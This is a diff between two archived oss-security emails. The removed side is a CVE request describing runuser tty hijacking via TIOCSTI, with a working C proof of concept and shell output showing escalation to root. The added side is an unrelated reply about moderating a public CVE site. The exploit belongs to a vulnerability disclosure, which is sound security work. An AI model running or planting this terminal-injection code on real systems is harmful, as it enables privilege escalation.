@@ -1,52 +1,36 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/27/1
-Message-ID: <20160226155416.82785yodpagwmigw@webmail.alunos.dcc.fc.up.pt>
-Date: Fri, 26 Feb 2016 15:54:16 +0100
-From: up201407890@...nos.dcc.fc.up.pt
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/10/1
+Message-ID: <56E0BE38.6030400@igalia.com>
+Date: Thu, 10 Mar 2016 01:22:16 +0100
+From: Carlos Alberto Lopez Perez <clopez@...lia.com>
 To: oss-security@...ts.openwall.com
-Cc: cve-assign@...re.org
-Subject: CVE Request: util-linux runuser tty hijacking via TIOCSTI ioctl
+Subject: Re: RE: Concerns about CVE coverage shrinking - direct impact to researchers/companies
 Content-Type: text/plain; charset=utf-8
 
-This is a similar issue to the one I posted yesterday on oss-sec, but  
-to runuser(1) from util-linux, which can only be run as root for the  
-purpose of executing programs as another user.
+On 06/03/16 19:46, Alan Coopersmith wrote:
+> On 03/ 4/16 04:07 PM, Tim wrote:
+>> * No moderation required.  Let the public decide if they believe the
+>>    researcher or vendor.  If a moderator does bother to look over the
+>>    content, they could deduplicate/link issues together and address any
+>>    confusion, but beyond that, it isn't their job to decide what is a
+>>    vulnerability and what isn't.
+> 
+> If the site displays *any* user-submitted text, you need at least enough
+> moderation to filter out spammers & trolls.
+> 
 
-https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=815922
+I don't think you need that level of moderation if you implement basic
+measures against spammers like requiring the creation of an account with
+e-mail verification.
 
-When executing a program via "runuser -u nonpriv program" the
-nonpriv session can
-escape to the parent session by using the TIOCSTI ioctl to push
-characters into the
-terminal's input buffer, allowing privilege escalation.
-This issue has been fixed in "su" by calling setsid() and in "sudo" by
-using the "use_pty" flag
+Just look to all the public bugzillas out there that allow commenting
+(mozilla, webkit, redhat, gnome, etc). I don't think they have a problem
+with spam. But you have to create an account first to do any comment.
 
-# cat test.c
-#include <sys/ioctl.h>
-
-int main()
-{
-char *cmd = "id\n";
-while(*cmd)
-ioctl(0, TIOCSTI, cmd++);
-}
-
-# gcc test.c -o test
-# id saken
-uid=1000(saken) gid=1000(saken) groups=1000(saken)
-
-# runuser -u saken ./test ---> last command i type in
-id
-# id ---> did not type this
-uid=0(root) gid=0(root) groups=0(root)
+Of course any account used for spam is blocked by the moderators. So the
+spammer has to create a new one, which is just not worth the effort.
 
 
-I'd like to request a CVE for this issue.
 
-Thanks,
-Federico Bento
 
-----------------------------------------------------------------
-This message was sent using IMP, the Internet Messaging Program.
-
+Download attachment "signature.asc" of type "application/pgp-signature" (884 bytes)
